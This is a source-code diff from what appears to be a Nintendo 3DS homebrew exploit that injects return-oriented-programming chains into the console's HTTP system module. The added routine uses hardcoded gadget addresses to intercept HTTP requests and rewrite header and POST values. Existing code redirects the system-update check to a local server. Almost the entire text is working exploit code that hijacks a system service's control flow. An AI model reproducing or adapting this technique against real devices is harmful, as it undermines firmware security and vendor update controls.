@@ -73,12 +73,11 @@ u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
 u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.
 
 u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the context-session.
-u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
 
 u32 ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE = 0x108;//Size of the vtable for the objptr from httpc_cmdhandler *(_this+16).
 
 static u32 ropvmem_base = 0x0f000000;
-u32 ropvmem_size = 0x5000;
+u32 ropvmem_size = 0x8000;
 
 u32 httpheap_size = 0x22000;
 
@@ -94,9 +93,9 @@ typedef struct _targeturl_requestoverridectx {
 	struct _targeturl_requestoverridectx *next;//Src data to copy to next_sharedmemptr.
 	struct _targeturl_requestoverridectx *next_sharedmemptr;
 
-	char name[16];
-	char target_value[16];
-	char new_value[16];
+	char name[0x40];//Must match the entire input name.
+	char value[0x40];//Optional, when set this must match the entire input value.
+	char new_value[0x40];
 } targeturl_requestoverridectx;
 
 typedef enum {
@@ -120,11 +119,28 @@ typedef struct {
 	char new_url[0x100];//Optional, when set the specified URL will overwrite the URL used with CreateContext, NUL-terminator included.
 } targeturlctx;
 
+//Currently the ROP ignores the entries starting with the second one for the targeturlctx and targeturl_requestoverridectx lists, unknown why exactly.
+
+targeturl_requestoverridectx reqoverride_test[2] = {
+	{
+		.next = &reqoverride_test[1],
+		.name = "User-Agent",
+		//.value = "CTR NUP 040600 Mar 14 2012 13:32:39",
+		.new_value = "HAX HAX"
+	},
+
+	{
+		.name = "SOAPAction",
+		.new_value = "HAX"
+	}
+};
+
 targeturlctx targeturl_list[] = {
 	{//This is the URL used for doing the actual sysupdate check / getting the the list of sysupdate titles.
-		.caps = TARGETURLCAP_SendPOSTDataRawTimeout,
+		.caps = TARGETURLCAP_SendPOSTDataRawTimeout | TARGETURLCAP_AddRequestHeader,
 		.url = "https://nus.c.shop.nintendowifi.net/nus/services/NetUpdateSOAP",
-		.new_url = "http://10.0.0.30/ctr-httpwn/NetUpdateSOAP"
+		.new_url = "http://10.0.0.30/ctr-httpwn/NetUpdateSOAP",
+		.reqheader = &reqoverride_test[0]
 	},
 
 	{//NNID
@@ -433,6 +449,158 @@ void ropgen_ret2cmdhandler(u32 **ropchain, u32 *http_ropvaddr)
 	ropgen_stackpivot(ropchain, http_ropvaddr, __httpmainthread_cmdhandler_stackframe-4);
 }
 
+void ropgen_requestoverride(u32 **ropchain, u32 *http_ropvaddr, u32 firstptr_ctxoffset)
+{
+	u32 tmpaddr0;
+
+	u32 namebufptr_vaddr = ropheap+0x30;
+	u32 valuebufptr_vaddr = ropheap+0x34;
+	u32 targeturlctx_vaddr = ropheap+0x38;
+	u32 curent = ropheap+0x3c;
+
+	u32 *ropchain_block0, ropvaddr_block0;
+	u32 *ropchain_block1, ropvaddr_block1;
+	u32 *ropchain_block2, ropvaddr_block2;
+	u32 *ropchain_block3, ropvaddr_block3;
+
+	u32 params[7];
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, ropheap+0x0, 1);//r0 = cmdbuf ptr.
+	ropgen_add_r0ip(ropchain, http_ropvaddr, 5*4);
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);//r0 = cmdbuf[5], name bufptr.
+	ropgen_strr0r1(ropchain, http_ropvaddr, namebufptr_vaddr, 1);//Write the bufptr to namebufptr_vaddr.
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, ropheap+0x0, 1);//r0 = cmdbuf ptr.
+	ropgen_add_r0ip(ropchain, http_ropvaddr, 7*4);
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);//r0 = cmdbuf[7], value bufptr.
+	ropgen_strr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);//Write the bufptr to valuebufptr_vaddr.
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, ropheap+0x24, 1);//r0 = context vtable ptr.
+	ropgen_add_r0ip(ropchain, http_ropvaddr, ROP_HTTPC_CMDHANDLER_OBJPTR_VTABLE_SIZE);
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);//r0 = vaddr of the targeturlctx for this context.
+	ropgen_strr0r1(ropchain, http_ropvaddr, targeturlctx_vaddr, 1);//Write the targeturlctx address for this context to ropheap+0x30.
+
+	ropgen_add_r0ip(ropchain, http_ropvaddr, firstptr_ctxoffset);
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);
+	ropgen_strr0r1(ropchain, http_ropvaddr, curent, 1);//Write the address of the first targeturl_requestoverridectx to curent.
+
+	/*
+	The rest of this ROP does:
+
+	if(curent)
+	{
+		for(; curent!=NULL; curent = curent->next_vaddr)
+		{
+			if(strncmp(input_namebuf, curent->name, 0x40-1)==0)
+			{
+				if(*((u32*)curent->value))
+				{
+					if(strncmp(input_valuebuf, curent->value, 0x40-1)!=0)continue;
+				}
+
+				strncpy(input_valuebuf, curent->new_value, strlen(input_valuebuf));
+				break;
+			}
+		}
+	}
+	*/
+
+	//if(curent==NULL)<jump over the rest of this ROP>
+	ropgen_popr1(ropchain, http_ropvaddr, 0);
+	ropchain_block2 = *ropchain;
+	ropvaddr_block2 = *http_ropvaddr;
+	ropgen_checkcond_necontinue_eqjump(ropchain, http_ropvaddr, 0);
+
+	tmpaddr0 = *http_ropvaddr;
+
+	memset(params, 0, sizeof(params));
+	params[2] = 0x40-1;
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, namebufptr_vaddr, 1);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(input_namebuf).
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x40 + 0x4, 1);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, namebufptr_vaddr, 1);
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncmp with input_namebuf.
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
+	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, name));
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->name.
+
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncmp, params);//strncmp(input_namebuf, curent->name, strlen(input_namebuf));
+
+	ropgen_popr1(ropchain, http_ropvaddr, 0);
+	ropchain_block0 = *ropchain;
+	ropvaddr_block0 = *http_ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(ropchain, http_ropvaddr, 0);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);//if(*((u32*)curent->value))
+	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, value));
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);
+
+	ropgen_popr1(ropchain, http_ropvaddr, 0);
+	ropchain_block1 = *ropchain;
+	ropvaddr_block1 = *http_ropvaddr;
+	ropgen_checkcond_necontinue_eqjump(ropchain, http_ropvaddr, 0);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncmp with strlen(input_valuebuf).
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x40 + 0x4, 1);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncmp with input_valuebuf.
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
+	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, value));
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncmp with curent->value.
+
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncmp, params);//strncmp(input_valuebuf, curent->value, strlen(input_valuebuf));
+
+	ropgen_popr1(ropchain, http_ropvaddr, 0);
+	ropchain_block3 = *ropchain;
+	ropvaddr_block3 = *http_ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(ropchain, http_ropvaddr, 0);
+
+	ropgen_checkcond_necontinue_eqjump(&ropchain_block1, &ropvaddr_block1, *http_ropvaddr);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_strlen, 1);//Overwrite the r2 value which will be used for the below strncpy with strlen(input_valuebuf).
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*5 + 0x40 + 0x4, 1);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, valuebufptr_vaddr, 1);
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20*3 + 0x40 + 0x3c + 0x4, 1);//Overwrite the r0 value which will be used for the below strncpy with input_valuebuf.
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);
+	ropgen_add_r0ip(ropchain, http_ropvaddr, offsetof(targeturl_requestoverridectx, new_value));
+	ropgen_strr0r1(ropchain, http_ropvaddr, *http_ropvaddr + 0x20 + 0x3c + 0x10 + 0x4, 1);//Overwrite the r1 value which will be used for the below strncpy with curent->value.
+
+	ropgen_callfunc(ropchain, http_ropvaddr, ROP_strncpy, params);//strncpy(input_valuebuf, curent->new_value, strlen(input_valuebuf));
+
+	ropchain_block1 = *ropchain;//break;
+	ropvaddr_block1 = *http_ropvaddr;
+	ropgen_stackpivot(ropchain, http_ropvaddr, 0);
+
+	ropgen_checkcond_eqcontinue_nejump(&ropchain_block0, &ropvaddr_block0, *http_ropvaddr);
+	ropgen_checkcond_eqcontinue_nejump(&ropchain_block3, &ropvaddr_block3, *http_ropvaddr);
+
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, curent, 1);//curent = curent->next_vaddr;
+	ropgen_movr1r0(ropchain, http_ropvaddr);
+	ropgen_ldrr0r1(ropchain, http_ropvaddr, 0, 0);
+	ropgen_strr0r1(ropchain, http_ropvaddr, curent, 1);
+
+	ropgen_popr1(ropchain, http_ropvaddr, 0);//if(curent==NULL)break;
+	ropgen_checkcond_eqcontinue_nejump(ropchain, http_ropvaddr, tmpaddr0);
+
+	ropgen_checkcond_necontinue_eqjump(&ropchain_block2, &ropvaddr_block2, *http_ropvaddr);
+
+	ropgen_stackpivot(&ropchain_block1, &ropvaddr_block1, *http_ropvaddr);
+}
+
 u32 memalloc_ropvmem_dataheap(u32 *curptr, u32 **sharedmem_ptr, u32 size)
 {
 	*curptr-= size;
@@ -462,7 +630,7 @@ void allocate_reqoverride_list(u32 *mainrop_endaddr, targeturl_requestoverridect
 
 void init_reqoverride_list(targeturl_requestoverridectx *first, targeturl_requestoverridectx *first_sharedmemptr)
 {
-	targeturl_requestoverridectx *reqctx, *reqctx_tmp, *sharedmemptr;
+	targeturl_requestoverridectx *reqctx, *sharedmemptr;
 
 	reqctx = first;
 	sharedmemptr = first_sharedmemptr;
@@ -471,10 +639,8 @@ void init_reqoverride_list(targeturl_requestoverridectx *first, targeturl_reques
 	{
 		memcpy(sharedmemptr, reqctx, sizeof(targeturl_requestoverridectx));
 
-		reqctx_tmp = reqctx;
 		sharedmemptr = reqctx->next_sharedmemptr;
 		reqctx = reqctx->next;
-		free(reqctx_tmp);
 	}
 }
 
@@ -665,7 +831,7 @@ Result setuphaxx_httpheap_sharedmem()
 	u32 *ropchain_block0, ropvaddr_block0;
 	u32 *ropchain_block1, ropvaddr_block1;
 
-	u32 ropallocsize = 0x2000;
+	u32 ropallocsize = 0x3000;
 	u32 ropoffset = 0x200;
 	u32 bakropoff = ropoffset + ropallocsize;
 	u32 roplaunch_bakaddr;
@@ -938,6 +1104,8 @@ Result setuphaxx_httpheap_sharedmem()
 
 	ropgen_checkcond(&ropchain1, &ropvaddr1, ropvaddr, 0, 1);
 
+	ropgen_requestoverride(&ropchain, &ropvaddr, offsetof(targeturlctx, reqheader_first_vaddr));
+
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x20 + 0x40 + 0x4, 0x3);//Overwrite the r4 value which gets popped below, with the saved cmdbuf ptr from above.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Restore r0 to the _this value copied above.
 	ropgen_setr4(&ropchain, &ropvaddr, 0);
@@ -950,6 +1118,8 @@ Result setuphaxx_httpheap_sharedmem()
 	//Setup the actual cmdhdr pivot for AddPostDataAscii, the actual ROP-chain for AddPostDataAscii follows this.
 
 	ropgen_checkcond(&ropchain2, &ropvaddr2, ropvaddr, 0, 1);
+
+	ropgen_requestoverride(&ropchain, &ropvaddr, offsetof(targeturlctx, postform_first_vaddr));
 
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x20 + 0x40 + 0x4, 0x3);//Overwrite the r4 value which gets popped below, with the saved cmdbuf ptr from above.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//Restore r0 to the _this value copied above.
